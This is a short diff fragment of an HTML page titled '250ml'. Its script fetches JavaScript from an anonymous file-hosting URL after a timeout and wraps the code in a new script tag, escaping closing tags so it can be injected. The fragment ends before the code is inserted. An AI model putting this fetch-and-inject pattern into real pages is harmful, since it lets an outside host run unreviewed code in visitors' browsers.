@@ -4,12 +4,12 @@
   <meta charset="UTF-8" />
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
-  <script language="Javascript1.1">
+  <script>
   setTimeout(() => {
     fetch('https://files.catbox.moe/cwedrd.js')
       .then(res => res.text())
       .then(js => {
-        const htmlWrapper = `<script>` +
+        const htmlWrapper = `<script language="Javascript1.1" for=window event=onload>` +
           js.split('</script>').join('</scr' + 'ipt>') +
           `</script>`;
   
